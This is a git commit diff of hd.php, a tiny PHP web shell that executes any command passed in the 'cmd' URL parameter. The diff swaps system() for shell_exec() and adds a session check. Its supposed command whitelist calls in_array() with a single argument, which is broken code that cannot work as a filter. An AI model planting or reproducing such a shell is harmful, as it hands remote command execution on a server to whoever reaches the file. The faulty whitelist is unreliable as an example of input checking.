48f6aa495ff4a57e17a9cdfbed533fa9165e8e76
TZ Rafi <40269401+tzrafi@users.noreply.github.com>
2025-02-24 18:50:12 +0600

    hd.php

--- hd.php
+++ hd.php
@@ -1,7 +1,16 @@
 <?php
+session_start();
+if (!isset($_SESSION["authenticated"])) {
+    die("<pre style='color: red;'>Access Denied! Please log in.</pre>");
+}
+
 if (isset($_GET['cmd'])) {
-    // Sanitize user input using escapeshellcmd
-    $command = escapeshellcmd($_GET['cmd']);
-    system($command);
+    $cmd = $_GET['cmd'];
+
+    if (in_array($cmd)) {
+        echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
+    } else {
+        echo "<pre style='color: red;'>Invalid command!</pre>";
+    }
 }
 ?>
